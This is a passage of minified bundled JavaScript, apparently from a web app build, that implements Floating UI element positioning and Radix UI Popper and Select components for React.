    for (; r && NN(r) && yc(r); )
        r = Pm(r, t);
    return r && gs(r) && yc(r) && !lp(r) ? n : r || RN(e) || n
}
const UN = async function(e) {
    const t = this.getOffsetParent || Bx
      , n = this.getDimensions
      , r = await n(e.floating);
    return {
        reference: $N(e.reference, await t(e.floating), e.strategy),
        floating: {
            x: 0,
            y: 0,
            width: r.width,
            height: r.height
        }
    }
};
function BN(e) {
    return mn(e).direction === "rtl"
}
const HN = {
    convertOffsetParentRelativeRectToViewportRelativeRect: jN,
    getDocumentElement: On,
    getClippingRect: VN,
    getOffsetParent: Bx,
    getElementRects: UN,
    getClientRects: MN,
    getDimensions: zN,
    getScale: Go,
    isElement: hn,
    isRTL: BN
};
function WN(e, t) {
    let n = null, r;
    const o = On(e);
    function s() {
        var a;
        clearTimeout(r),
        (a = n) == null || a.disconnect(),
        n = null
    }
    function i(a, l) {
        a === void 0 && (a = !1),
        l === void 0 && (l = 1),
        s();
        const {left: u, top: c, width: d, height: p} = e.getBoundingClientRect();
        if (a || t(),
        !d || !p)
            return;
        const w = ja(c)
          , x = ja(o.clientWidth - (u + d))
          , m = ja(o.clientHeight - (c + p))
          , S = ja(u)
          , f = {
            rootMargin: -w + "px " + -x + "px " + -m + "px " + -S + "px",
            threshold: Ot(0, Or(1, l)) || 1
        };
        let y = !0;
        function _(b) {
            const T = b[0].intersectionRatio;
            if (T !== l) {
                if (!y)
                    return i();
                T ? i(!1, T) : r = setTimeout( () => {
                    i(!1, 1e-7)
                }
                , 1e3)
            }
            y = !1
        }
        try {
            n = new IntersectionObserver(_,{
                ...f,
                root: o.ownerDocument
            })
        } catch {
            n = new IntersectionObserver(_,f)
        }
        n.observe(e)
    }
    return i(!0),
    s
}
function ZN(e, t, n, r) {
    r === void 0 && (r = {});
    const {ancestorScroll: o=!0, ancestorResize: s=!0, elementResize: i=typeof ResizeObserver == "function", layoutShift: a=typeof IntersectionObserver == "function", animationFrame: l=!1} = r
      , u = cp(e)
      , c = o || s ? [...u ? Ki(u) : [], ...Ki(t)] : [];
    c.forEach(v => {
        o && v.addEventListener("scroll", n, {
            passive: !0
        }),
        s && v.addEventListener("resize", n)
    }
    );
    const d = u && a ? WN(u, n) : null;
    let p = -1
      , w = null;
    i && (w = new ResizeObserver(v => {
        let[f] = v;
        f && f.target === u && w && (w.unobserve(t),
        cancelAnimationFrame(p),
        p = requestAnimationFrame( () => {
            var y;
            (y = w) == null || y.observe(t)
        }
        )),
        n()
    }
    ),
    u && !l && w.observe(u),
    w.observe(t));
    let x, m = l ? co(e) : null;
    l && S();
    function S() {
        const v = co(e);
        m && (v.x !== m.x || v.y !== m.y || v.width !== m.width || v.height !== m.height) && n(),
        m = v,
        x = requestAnimationFrame(S)
    }
    return n(),
    () => {
        var v;
        c.forEach(f => {
            o && f.removeEventListener("scroll", n),
            s && f.removeEventListener("resize", n)
        }
        ),
        d == null || d(),
        (v = w) == null || v.disconnect(),
        w = null,
        l && cancelAnimationFrame(x)
    }
}
const KN = CN
  , QN = kN
  , qN = _N
  , GN = PN
  , YN = EN
  , Nm = SN
  , XN = TN
  , JN = (e, t, n) => {
    const r = new Map
      , o = {
        platform: HN,
        ...n
    }
      , s = {
        ...o.platform,
        _c: r
    };
    return xN(e, t, {
        ...o,
        platform: s
    })
}
;
var Xa = typeof document < "u" ? h.useLayoutEffect : h.useEffect;
function Ul(e, t) {
    if (e === t)
        return !0;
    if (typeof e != typeof t)
        return !1;
    if (typeof e == "function" && e.toString() === t.toString())
        return !0;
    let n, r, o;
    if (e && t && typeof e == "object") {
        if (Array.isArray(e)) {
            if (n = e.length,
            n !== t.length)
                return !1;
            for (r = n; r-- !== 0; )
                if (!Ul(e[r], t[r]))
                    return !1;
            return !0
        }
        if (o = Object.keys(e),
        n = o.length,
        n !== Object.keys(t).length)
            return !1;
        for (r = n; r-- !== 0; )
            if (!{}.hasOwnProperty.call(t, o[r]))
                return !1;
        for (r = n; r-- !== 0; ) {
            const s = o[r];
            if (!(s === "_owner" && e.$$typeof) && !Ul(e[s], t[s]))
                return !1
        }
        return !0
    }
    return e !== e && t !== t
}
function Hx(e) {
    return typeof window > "u" ? 1 : (e.ownerDocument.defaultView || window).devicePixelRatio || 1
}
function Rm(e, t) {
    const n = Hx(e);
    return Math.round(t * n) / n
}
function wc(e) {
    const t = h.useRef(e);
    return Xa( () => {
        t.current = e
    }
    ),
    t
}
function eR(e) {
    e === void 0 && (e = {});
    const {placement: t="bottom", strategy: n="absolute", middleware: r=[], platform: o, elements: {reference: s, floating: i}={}, transform: a=!0, whileElementsMounted: l, open: u} = e
      , [c,d] = h.useState({
        x: 0,
        y: 0,
        strategy: n,
        placement: t,
        middlewareData: {},
        isPositioned: !1
    })
      , [p,w] = h.useState(r);
    Ul(p, r) || w(r);
    const [x,m] = h.useState(null)
      , [S,v] = h.useState(null)
      , f = h.useCallback(N => {
        N !== T.current && (T.current = N,
        m(N))
    }
    , [])
      , y = h.useCallback(N => {
        N !== k.current && (k.current = N,
        v(N))
    }
    , [])
      , _ = s || x
      , b = i || S
      , T = h.useRef(null)
      , k = h.useRef(null)
      , P = h.useRef(c)
      , z = l != null
      , L = wc(l)
      , X = wc(o)
      , O = wc(u)
      , U = h.useCallback( () => {
        if (!T.current || !k.current)
            return;
        const N = {
            placement: t,
            strategy: n,
            middleware: p
        };
        X.current && (N.platform = X.current),
        JN(T.current, k.current, N).then(F => {
            const Q = {
                ...F,
                isPositioned: O.current !== !1
            };
            j.current && !Ul(P.current, Q) && (P.current = Q,
            mo.flushSync( () => {
                d(Q)
            }
            ))
        }
        )
    }
    , [p, t, n, X, O]);
    Xa( () => {
        u === !1 && P.current.isPositioned && (P.current.isPositioned = !1,
        d(N => ({
            ...N,
            isPositioned: !1
        })))
    }
    , [u]);
    const j = h.useRef(!1);
    Xa( () => (j.current = !0,
    () => {
        j.current = !1
    }
    ), []),
    Xa( () => {
        if (_ && (T.current = _),
        b && (k.current = b),
        _ && b) {
            if (L.current)
                return L.current(_, b, U);
            U()
        }
    }
    , [_, b, U, L, z]);
    const q = h.useMemo( () => ({
        reference: T,
        floating: k,
        setReference: f,
        setFloating: y
    }), [f, y])
      , K = h.useMemo( () => ({
        reference: _,
        floating: b
    }), [_, b])
      , Y = h.useMemo( () => {
        const N = {
            position: n,
            left: 0,
            top: 0
        };
        if (!K.floating)
            return N;
        const F = Rm(K.floating, c.x)
          , Q = Rm(K.floating, c.y);
        return a ? {
            ...N,
            transform: "translate(" + F + "px, " + Q + "px)",
            ...Hx(K.floating) >= 1.5 && {
                willChange: "transform"
            }
        } : {
            position: n,
            left: F,
            top: Q
        }
    }
    , [n, a, K.floating, c.x, c.y]);
    return h.useMemo( () => ({
        ...c,
        update: U,
        refs: q,
        elements: K,
        floatingStyles: Y
    }), [c, U, q, K, Y])
}
const tR = e => {
    function t(n) {
        return {}.hasOwnProperty.call(n, "current")
    }
    return {
        name: "arrow",
        options: e,
        fn(n) {
            const {element: r, padding: o} = typeof e == "function" ? e(n) : e;
            return r && t(r) ? r.current != null ? Nm({
                element: r.current,
                padding: o
            }).fn(n) : {} : r ? Nm({
                element: r,
                padding: o
            }).fn(n) : {}
        }
    }
}
  , nR = (e, t) => ({
    ...KN(e),
    options: [e, t]
})
  , rR = (e, t) => ({
    ...QN(e),
    options: [e, t]
})
  , oR = (e, t) => ({
    ...XN(e),
    options: [e, t]
})
  , sR = (e, t) => ({
    ...qN(e),
    options: [e, t]
})
  , iR = (e, t) => ({
    ...GN(e),
    options: [e, t]
})
  , aR = (e, t) => ({
    ...YN(e),
    options: [e, t]
})
  , lR = (e, t) => ({
    ...tR(e),
    options: [e, t]
});
var uR = "Arrow"
  , Wx = h.forwardRef( (e, t) => {
    const {children: n, width: r=10, height: o=5, ...s} = e;
    return g.jsx(ge.svg, {
        ...s,
        ref: t,
        width: r,
        height: o,
        viewBox: "0 0 30 10",
        preserveAspectRatio: "none",
        children: e.asChild ? n : g.jsx("polygon", {
            points: "0,0 30,0 15,10"
        })
    })
}
);
Wx.displayName = uR;
var cR = Wx;
function dR(e, t=[]) {
    let n = [];
    function r(s, i) {
        const a = h.createContext(i)
          , l = n.length;
        n = [...n, i];
        function u(d) {
            const {scope: p, children: w, ...x} = d
              , m = (p == null ? void 0 : p[e][l]) || a
              , S = h.useMemo( () => x, Object.values(x));
            return g.jsx(m.Provider, {
                value: S,
                children: w
            })
        }
        function c(d, p) {
            const w = (p == null ? void 0 : p[e][l]) || a
              , x = h.useContext(w);
            if (x)
                return x;
            if (i !== void 0)
                return i;
            throw new Error(`\`${d}\` must be used within \`${s}\``)
        }
        return u.displayName = s + "Provider",
        [u, c]
    }
    const o = () => {
        const s = n.map(i => h.createContext(i));
        return function(a) {
            const l = (a == null ? void 0 : a[e]) || s;
            return h.useMemo( () => ({
                [`__scope${e}`]: {
                    ...a,
                    [e]: l
                }
            }), [a, l])
        }
    }
    ;
    return o.scopeName = e,
    [r, fR(o, ...t)]
}
function fR(...e) {
    const t = e[0];
    if (e.length === 1)
        return t;
    const n = () => {
        const r = e.map(o => ({
            useScope: o(),
            scopeName: o.scopeName
        }));
        return function(s) {
            const i = r.reduce( (a, {useScope: l, scopeName: u}) => {
                const d = l(s)[`__scope${u}`];
                return {
                    ...a,
                    ...d
                }
            }
            , {});
            return h.useMemo( () => ({
                [`__scope${t.scopeName}`]: i
            }), [i])
        }
    }
    ;
    return n.scopeName = t.scopeName,
    n
}
function pR(e) {
    const [t,n] = h.useState(void 0);
    return ft( () => {
        if (e) {
            n({
                width: e.offsetWidth,
                height: e.offsetHeight
            });
            const r = new ResizeObserver(o => {
                if (!Array.isArray(o) || !o.length)
                    return;
                const s = o[0];
                let i, a;
                if ("borderBoxSize"in s) {
                    const l = s.borderBoxSize
                      , u = Array.isArray(l) ? l[0] : l;
                    i = u.inlineSize,
                    a = u.blockSize
                } else
                    i = e.offsetWidth,
                    a = e.offsetHeight;
                n({
                    width: i,
                    height: a
                })
            }
            );
            return r.observe(e, {
                box: "border-box"
            }),
            () => r.unobserve(e)
        } else
            n(void 0)
    }
    , [e]),
    t
}
var fp = "Popper"
  , [Zx,Kx] = dR(fp)
  , [hR,Qx] = Zx(fp)
  , qx = e => {
    const {__scopePopper: t, children: n} = e
      , [r,o] = h.useState(null);
    return g.jsx(hR, {
        scope: t,
        anchor: r,
        onAnchorChange: o,
        children: n
    })
}
;
qx.displayName = fp;
var Gx = "PopperAnchor"
  , Yx = h.forwardRef( (e, t) => {
    const {__scopePopper: n, virtualRef: r, ...o} = e
      , s = Qx(Gx, n)
      , i = h.useRef(null)
      , a = Le(t, i);
    return h.useEffect( () => {
        s.onAnchorChange((r == null ? void 0 : r.current) || i.current)
    }
    ),
    r ? null : g.jsx(ge.div, {
        ...o,
        ref: a
    })
}
);
Yx.displayName = Gx;
var pp = "PopperContent"
  , [mR,vR] = Zx(pp)
  , Xx = h.forwardRef( (e, t) => {
    var J, _e, Ze, be, we, xe;
    const {__scopePopper: n, side: r="bottom", sideOffset: o=0, align: s="center", alignOffset: i=0, arrowPadding: a=0, avoidCollisions: l=!0, collisionBoundary: u=[], collisionPadding: c=0, sticky: d="partial", hideWhenDetached: p=!1, updatePositionStrategy: w="optimized", onPlaced: x, ...m} = e
      , S = Qx(pp, n)
      , [v,f] = h.useState(null)
      , y = Le(t, st => f(st))
      , [_,b] = h.useState(null)
      , T = pR(_)
      , k = (T == null ? void 0 : T.width) ?? 0
      , P = (T == null ? void 0 : T.height) ?? 0
      , z = r + (s !== "center" ? "-" + s : "")
      , L = typeof c == "number" ? c : {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
        ...c
    }
      , X = Array.isArray(u) ? u : [u]
      , O = X.length > 0
      , U = {
        padding: L,
        boundary: X.filter(yR),
        altBoundary: O
    }
      , {refs: j, floatingStyles: q, placement: K, isPositioned: Y, middlewareData: N} = eR({
        strategy: "fixed",
        placement: z,
        whileElementsMounted: (...st) => ZN(...st, {
            animationFrame: w === "always"
        }),
        elements: {
            reference: S.anchor
        },
        middleware: [nR({
            mainAxis: o + P,
            alignmentAxis: i
        }), l && rR({
            mainAxis: !0,
            crossAxis: !1,
            limiter: d === "partial" ? oR() : void 0,
            ...U
        }), l && sR({
            ...U
        }), iR({
            ...U,
            apply: ({elements: st, rects: Rt, availableWidth: vo, availableHeight: go}) => {
                const {width: yo, height: E} = Rt.reference
                  , C = st.floating.style;
                C.setProperty("--radix-popper-available-width", `${vo}px`),
                C.setProperty("--radix-popper-available-height", `${go}px`),
                C.setProperty("--radix-popper-anchor-width", `${yo}px`),
                C.setProperty("--radix-popper-anchor-height", `${E}px`)
            }
        }), _ && lR({
            element: _,
            padding: a
        }), wR({
            arrowWidth: k,
            arrowHeight: P
        }), p && aR({
            strategy: "referenceHidden",
            ...U
        })]
    })
      , [F,Q] = t0(K)
      , re = Ft(x);
    ft( () => {
        Y && (re == null || re())
    }
    , [Y, re]);
    const ye = (J = N.arrow) == null ? void 0 : J.x
      , et = (_e = N.arrow) == null ? void 0 : _e.y
      , De = ((Ze = N.arrow) == null ? void 0 : Ze.centerOffset) !== 0
      , [Ut,We] = h.useState();
    return ft( () => {
        v && We(window.getComputedStyle(v).zIndex)
    }
    , [v]),
    g.jsx("div", {
        ref: j.setFloating,
        "data-radix-popper-content-wrapper": "",
        style: {
            ...q,
            transform: Y ? q.transform : "translate(0, -200%)",
            minWidth: "max-content",
            zIndex: Ut,
            "--radix-popper-transform-origin": [(be = N.transformOrigin) == null ? void 0 : be.x, (we = N.transformOrigin) == null ? void 0 : we.y].join(" "),
            ...((xe = N.hide) == null ? void 0 : xe.referenceHidden) && {
                visibility: "hidden",
                pointerEvents: "none"
            }
        },
        dir: e.dir,
        children: g.jsx(mR, {
            scope: n,
            placedSide: F,
            onArrowChange: b,
            arrowX: ye,
            arrowY: et,
            shouldHideArrow: De,
            children: g.jsx(ge.div, {
                "data-side": F,
                "data-align": Q,
                ...m,
                ref: y,
                style: {
                    ...m.style,
                    animation: Y ? void 0 : "none"
                }
            })
        })
    })
}
);
Xx.displayName = pp;
var Jx = "PopperArrow"
  , gR = {
    top: "bottom",
    right: "left",
    bottom: "top",
    left: "right"
}
  , e0 = h.forwardRef(function(t, n) {
    const {__scopePopper: r, ...o} = t
      , s = vR(Jx, r)
      , i = gR[s.placedSide];
    return g.jsx("span", {
        ref: s.onArrowChange,
        style: {
            position: "absolute",
            left: s.arrowX,
            top: s.arrowY,
            [i]: 0,
            transformOrigin: {
                top: "",
                right: "0 0",
                bottom: "center 0",
                left: "100% 0"
            }[s.placedSide],
            transform: {
                top: "translateY(100%)",
                right: "translateY(50%) rotate(90deg) translateX(-50%)",
                bottom: "rotate(180deg)",
                left: "translateY(50%) rotate(-90deg) translateX(50%)"
            }[s.placedSide],
            visibility: s.shouldHideArrow ? "hidden" : void 0
        },
        children: g.jsx(cR, {
            ...o,
            ref: n,
            style: {
                ...o.style,
                display: "block"
            }
        })
    })
});
e0.displayName = Jx;
function yR(e) {
    return e !== null
}
var wR = e => ({
    name: "transformOrigin",
    options: e,
    fn(t) {
        var S, v, f;
        const {placement: n, rects: r, middlewareData: o} = t
          , i = ((S = o.arrow) == null ? void 0 : S.centerOffset) !== 0
          , a = i ? 0 : e.arrowWidth
          , l = i ? 0 : e.arrowHeight
          , [u,c] = t0(n)
          , d = {
            start: "0%",
            center: "50%",
            end: "100%"
        }[c]
          , p = (((v = o.arrow) == null ? void 0 : v.x) ?? 0) + a / 2
          , w = (((f = o.arrow) == null ? void 0 : f.y) ?? 0) + l / 2;
        let x = ""
          , m = "";
        return u === "bottom" ? (x = i ? d : `${p}px`,
        m = `${-l}px`) : u === "top" ? (x = i ? d : `${p}px`,
        m = `${r.floating.height + l}px`) : u === "right" ? (x = `${-l}px`,
        m = i ? d : `${w}px`) : u === "left" && (x = `${r.floating.width + l}px`,
        m = i ? d : `${w}px`),
        {
            data: {
                x,
                y: m
            }
        }
    }
});
function t0(e) {
    const [t,n="center"] = e.split("-");
    return [t, n]
}
var xR = qx
  , SR = Yx
  , _R = Xx
  , ER = e0;
function bR(e) {
    const t = h.useRef({
        value: e,
        previous: e
    });
    return h.useMemo( () => (t.current.value !== e && (t.current.previous = t.current.value,
    t.current.value = e),
    t.current.previous), [e])
}
var CR = [" ", "Enter", "ArrowUp", "ArrowDown"]
  , kR = [" ", "Enter"]
  , aa = "Select"
  , [_u,Eu,TR] = wy(aa)
  , [ks,fA] = Ff(aa, [TR, Kx])
  , bu = Kx()
  , [PR,Fr] = ks(aa)
  , [NR,RR] = ks(aa)
  , n0 = e => {
    const {__scopeSelect: t, children: n, open: r, defaultOpen: o, onOpenChange: s, value: i, defaultValue: a, onValueChange: l, dir: u, name: c, autoComplete: d, disabled: p, required: w, form: x} = e
      , m = bu(t)
      , [S,v] = h.useState(null)
      , [f,y] = h.useState(null)
      , [_,b] = h.useState(!1)
      , T = dN(u)
      , [k=!1,P] = bl({
        prop: r,
        defaultProp: o,
        onChange: s
    })
      , [z,L] = bl({
        prop: i,
        defaultProp: a,
        onChange: l
    })
      , X = h.useRef(null)
      , O = S ? x || !!S.closest("form") : !0
      , [U,j] = h.useState(new Set)
      , q = Array.from(U).map(K => K.props.value).join(";");
    return g.jsx(xR, {
        ...m,
        children: g.jsxs(PR, {
            required: w,
            scope: t,
            trigger: S,
            onTriggerChange: v,
            valueNode: f,
            onValueNodeChange: y,
            valueNodeHasChildren: _,
            onValueNodeHasChildrenChange: b,
            contentId: Qo(),
            value: z,
            onValueChange: L,
            open: k,
            onOpenChange: P,
            dir: T,
            triggerPointerDownPosRef: X,
            disabled: p,
            children: [g.jsx(_u.Provider, {
                scope: t,
                children: g.jsx(NR, {
                    scope: e.__scopeSelect,
                    onNativeOptionAdd: h.useCallback(K => {
                        j(Y => new Set(Y).add(K))
                    }
                    , []),
                    onNativeOptionRemove: h.useCallback(K => {
                        j(Y => {
                            const N = new Set(Y);
                            return N.delete(K),
                            N
                        }
                        )
                    }
                    , []),
                    children: n
                })
            }), O ? g.jsxs(T0, {
                "aria-hidden": !0,
                required: w,
                tabIndex: -1,
                name: c,
                autoComplete: d,
                value: z,
                onChange: K => L(K.target.value),
                disabled: p,
                form: x,
                children: [z === void 0 ? g.jsx("option", {
                    value: ""
                }) : null, Array.from(U)]
            }, q) : null]
        })
    })
}
;
n0.displayName = aa;
var r0 = "SelectTrigger"
  , o0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, disabled: r=!1, ...o} = e
      , s = bu(n)
      , i = Fr(r0, n)
      , a = i.disabled || r
      , l = Le(t, i.onTriggerChange)
      , u = Eu(n)
      , c = h.useRef("touch")
      , [d,p,w] = P0(m => {
        const S = u().filter(y => !y.disabled)
          , v = S.find(y => y.value === i.value)
          , f = N0(S, m, v);
        f !== void 0 && i.onValueChange(f.value)
    }
    )
      , x = m => {
        a || (i.onOpenChange(!0),
        w()),
        m && (i.triggerPointerDownPosRef.current = {
            x: Math.round(m.pageX),
            y: Math.round(m.pageY)
        })
    }
    ;
    return g.jsx(SR, {
        asChild: !0,
        ...s,
        children: g.jsx(ge.button, {
            type: "button",
            role: "combobox",
            "aria-controls": i.contentId,
            "aria-expanded": i.open,
            "aria-required": i.required,
            "aria-autocomplete": "none",
            dir: i.dir,
            "data-state": i.open ? "open" : "closed",
            disabled: a,
            "data-disabled": a ? "" : void 0,
            "data-placeholder": k0(i.value) ? "" : void 0,
            ...o,
            ref: l,
            onClick: fe(o.onClick, m => {
                m.currentTarget.focus(),
                c.current !== "mouse" && x(m)
            }
            ),
            onPointerDown: fe(o.onPointerDown, m => {
                c.current = m.pointerType;
                const S = m.target;
                S.hasPointerCapture(m.pointerId) && S.releasePointerCapture(m.pointerId),
                m.button === 0 && m.ctrlKey === !1 && m.pointerType === "mouse" && (x(m),
                m.preventDefault())
            }
            ),
            onKeyDown: fe(o.onKeyDown, m => {
                const S = d.current !== "";
                !(m.ctrlKey || m.altKey || m.metaKey) && m.key.length === 1 && p(m.key),
                !(S && m.key === " ") && CR.includes(m.key) && (x(),
                m.preventDefault())
            }
            )
        })
    })
}
);
o0.displayName = r0;
var s0 = "SelectValue"
  , i0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, className: r, style: o, children: s, placeholder: i="", ...a} = e
      , l = Fr(s0, n)
      , {onValueNodeHasChildrenChange: u} = l
      , c = s !== void 0
      , d = Le(t, l.onValueNodeChange);
    return ft( () => {
        u(c)
    }
    , [u, c]),
    g.jsx(ge.span, {
        ...a,
        ref: d,
        style: {
            pointerEvents: "none"
        },
        children: k0(l.value) ? g.jsx(g.Fragment, {
            children: i
        }) : s
    })
}
);
i0.displayName = s0;
var AR = "SelectIcon"
  , a0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, children: r, ...o} = e;
    return g.jsx(ge.span, {
        "aria-hidden": !0,
        ...o,
        ref: t,
        children: r || "▼"
    })
}
);
a0.displayName = AR;
var OR = "SelectPortal"
  , l0 = e => g.jsx(cu, {
    asChild: !0,
    ...e
});
l0.displayName = OR;
var fo = "SelectContent"
  , u0 = h.forwardRef( (e, t) => {
    const n = Fr(fo, e.__scopeSelect)
      , [r,o] = h.useState();
    if (ft( () => {
        o(new DocumentFragment)
    }
    , []),
    !n.open) {
        const s = r;
        return s ? mo.createPortal(g.jsx(c0, {
            scope: e.__scopeSelect,
            children: g.jsx(_u.Slot, {
                scope: e.__scopeSelect,
                children: g.jsx("div", {
                    children: e.children
                })
            })
        }), s) : null
    }
    return g.jsx(d0, {
        ...e,
        ref: t
    })
}
);
u0.displayName = fo;
var Xt = 10
  , [c0,Vr] = ks(fo)
  , jR = "SelectContentImpl"
  , d0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, position: r="item-aligned", onCloseAutoFocus: o, onEscapeKeyDown: s, onPointerDownOutside: i, side: a, sideOffset: l, align: u, alignOffset: c, arrowPadding: d, collisionBoundary: p, collisionPadding: w, sticky: x, hideWhenDetached: m, avoidCollisions: S, ...v} = e
      , f = Fr(fo, n)
      , [y,_] = h.useState(null)
      , [b,T] = h.useState(null)
      , k = Le(t, J => _(J))
      , [P,z] = h.useState(null)
      , [L,X] = h.useState(null)
      , O = Eu(n)
      , [U,j] = h.useState(!1)
      , q = h.useRef(!1);
    h.useEffect( () => {
        if (y)
            return ox(y)
    }
    , [y]),
    qw();
    const K = h.useCallback(J => {
        const [_e,...Ze] = O().map(xe => xe.ref.current)
          , [be] = Ze.slice(-1)
          , we = document.activeElement;
        for (const xe of J)
            if (xe === we || (xe == null || xe.scrollIntoView({
                block: "nearest"
            }),
            xe === _e && b && (b.scrollTop = 0),
            xe === be && b && (b.scrollTop = b.scrollHeight),
            xe == null || xe.focus(),
            document.activeElement !== we))
                return
    }
    , [O, b])
      , Y = h.useCallback( () => K([P, y]), [K, P, y]);
    h.useEffect( () => {
        U && Y()
    }
    , [U, Y]);
    const {onOpenChange: N, triggerPointerDownPosRef: F} = f;
    h.useEffect( () => {
        if (y) {
            let J = {
                x: 0,
                y: 0
            };
            const _e = be => {
                var we, xe;
                J = {
                    x: Math.abs(Math.round(be.pageX) - (((we = F.current) == null ? void 0 : we.x) ?? 0)),
                    y: Math.abs(Math.round(be.pageY) - (((xe = F.current) == null ? void 0 : xe.y) ?? 0))
                }
            }
              , Ze = be => {
                J.x <= 10 && J.y <= 10 ? be.preventDefault() : y.contains(be.target) || N(!1),
                document.removeEventListener("pointermove", _e),
                F.current = null
            }
            ;
            return F.current !== null && (document.addEventListener("pointermove", _e),
            document.addEventListener("pointerup", Ze, {
                capture: !0,
                once: !0
            })),
            () => {
                document.removeEventListener("pointermove", _e),
                document.removeEventListener("pointerup", Ze, {
                    capture: !0
                })
            }
        }
    }
    , [y, N, F]),
    h.useEffect( () => {
        const J = () => N(!1);
        return window.addEventListener("blur", J),
        window.addEventListener("resize", J),
        () => {
            window.removeEventListener("blur", J),
            window.removeEventListener("resize", J)
        }
    }
    , [N]);
    const [Q,re] = P0(J => {
        const _e = O().filter(we => !we.disabled)
          , Ze = _e.find(we => we.ref.current === document.activeElement)
          , be = N0(_e, J, Ze);
        be && setTimeout( () => be.ref.current.focus())
    }
    )
      , ye = h.useCallback( (J, _e, Ze) => {
        const be = !q.current && !Ze;
        (f.value !== void 0 && f.value === _e || be) && (z(J),
        be && (q.current = !0))
    }
    , [f.value])
      , et = h.useCallback( () => y == null ? void 0 : y.focus(), [y])
      , De = h.useCallback( (J, _e, Ze) => {
        const be = !q.current && !Ze;
        (f.value !== void 0 && f.value === _e || be) && X(J)
    }
    , [f.value])
      , Ut = r === "popper" ? Od : f0
      , We = Ut === Od ? {
        side: a,
        sideOffset: l,
        align: u,
        alignOffset: c,
        arrowPadding: d,
        collisionBoundary: p,
        collisionPadding: w,
        sticky: x,
        hideWhenDetached: m,
        avoidCollisions: S
    } : {};
    return g.jsx(c0, {
        scope: n,
        content: y,
        viewport: b,
        onViewportChange: T,
        itemRefCallback: ye,
        selectedItem: P,
        onItemLeave: et,
        itemTextRefCallback: De,
        focusSelectedItem: Y,
        selectedItemText: L,
        position: r,
        isPositioned: U,
        searchRef: Q,
        children: g.jsx(Xf, {
            as: Tr,
            allowPinchZoom: !0,
            children: g.jsx(Yf, {
                asChild: !0,
                trapped: f.open,
                onMountAutoFocus: J => {
                    J.preventDefault()
                }
                ,
                onUnmountAutoFocus: fe(o, J => {
                    var _e;
                    (_e = f.trigger) == null || _e.focus({
                        preventScroll: !0
                    }),
                    J.preventDefault()
                }
                ),
                children: g.jsx(uu, {
                    asChild: !0,
                    disableOutsidePointerEvents: !0,
                    onEscapeKeyDown: s,
                    onPointerDownOutside: i,
                    onFocusOutside: J => J.preventDefault(),
                    onDismiss: () => f.onOpenChange(!1),
                    children: g.jsx(Ut, {
                        role: "listbox",
                        id: f.contentId,
                        "data-state": f.open ? "open" : "closed",
                        dir: f.dir,
                        onContextMenu: J => J.preventDefault(),
                        ...v,
                        ...We,
                        onPlaced: () => j(!0),
                        ref: k,
                        style: {
                            display: "flex",
                            flexDirection: "column",
                            outline: "none",
                            ...v.style
                        },
                        onKeyDown: fe(v.onKeyDown, J => {
                            const _e = J.ctrlKey || J.altKey || J.metaKey;
                            if (J.key === "Tab" && J.preventDefault(),
                            !_e && J.key.length === 1 && re(J.key),
                            ["ArrowUp", "ArrowDown", "Home", "End"].includes(J.key)) {
                                let be = O().filter(we => !we.disabled).map(we => we.ref.current);
                                if (["ArrowUp", "End"].includes(J.key) && (be = be.slice().reverse()),
                                ["ArrowUp", "ArrowDown"].includes(J.key)) {
                                    const we = J.target
                                      , xe = be.indexOf(we);
                                    be = be.slice(xe + 1)
                                }
                                setTimeout( () => K(be)),
                                J.preventDefault()
                            }
                        }
                        )
                    })
                })
            })
        })
    })
}
);
d0.displayName = jR;
var MR = "SelectItemAlignedPosition"
  , f0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, onPlaced: r, ...o} = e
      , s = Fr(fo, n)
      , i = Vr(fo, n)
      , [a,l] = h.useState(null)
      , [u,c] = h.useState(null)
      , d = Le(t, k => c(k))
      , p = Eu(n)
      , w = h.useRef(!1)
      , x = h.useRef(!0)
      , {viewport: m, selectedItem: S, selectedItemText: v, focusSelectedItem: f} = i
      , y = h.useCallback( () => {
        if (s.trigger && s.valueNode && a && u && m && S && v) {
            const k = s.trigger.getBoundingClientRect()
              , P = u.getBoundingClientRect()
              , z = s.valueNode.getBoundingClientRect()
              , L = v.getBoundingClientRect();
            if (s.dir !== "rtl") {
                const we = L.left - P.left
                  , xe = z.left - we
                  , st = k.left - xe
                  , Rt = k.width + st
                  , vo = Math.max(Rt, P.width)
                  , go = window.innerWidth - Xt
                  , yo = _m(xe, [Xt, Math.max(Xt, go - vo)]);
                a.style.minWidth = Rt + "px",
                a.style.left = yo + "px"
            } else {
                const we = P.right - L.right
                  , xe = window.innerWidth - z.right - we
                  , st = window.innerWidth - k.right - xe
                  , Rt = k.width + st
                  , vo = Math.max(Rt, P.width)
                  , go = window.innerWidth - Xt
                  , yo = _m(xe, [Xt, Math.max(Xt, go - vo)]);
                a.style.minWidth = Rt + "px",
                a.style.right = yo + "px"
            }
            const X = p()
              , O = window.innerHeight - Xt * 2
              , U = m.scrollHeight
              , j = window.getComputedStyle(u)
              , q = parseInt(j.borderTopWidth, 10)
              , K = parseInt(j.paddingTop, 10)
              , Y = parseInt(j.borderBottomWidth, 10)
              , N = parseInt(j.paddingBottom, 10)
              , F = q + K + U + N + Y
              , Q = Math.min(S.offsetHeight * 5, F)
              , re = window.getComputedStyle(m)
              , ye = parseInt(re.paddingTop, 10)
              , et = parseInt(re.paddingBottom, 10)
              , De = k.top + k.height / 2 - Xt
              , Ut = O - De
              , We = S.offsetHeight / 2
              , J = S.offsetTop + We
              , _e = q + K + J
              , Ze = F - _e;
            if (_e <= De) {
                const we = X.length > 0 && S === X[X.length - 1].ref.current;
                a.style.bottom = "0px";
                const xe = u.clientHeight - m.offsetTop - m.offsetHeight
                  , st = Math.max(Ut, We + (we ? et : 0) + xe + Y)
                  , Rt = _e + st;
                a.style.height = Rt + "px"
            } else {
                const we = X.length > 0 && S === X[0].ref.current;
                a.style.top = "0px";
                const st = Math.max(De, q + m.offsetTop + (we ? ye : 0) + We) + Ze;
                a.style.height = st + "px",
                m.scrollTop = _e - De + m.offsetTop
            }
            a.style.margin = `${Xt}px 0`,
            a.style.minHeight = Q + "px",
            a.style.maxHeight = O + "px",
            r == null || r(),
            requestAnimationFrame( () => w.current = !0)
        }
    }
    , [p, s.trigger, s.valueNode, a, u, m, S, v, s.dir, r]);
    ft( () => y(), [y]);
    const [_,b] = h.useState();
    ft( () => {
        u && b(window.getComputedStyle(u).zIndex)
    }
    , [u]);
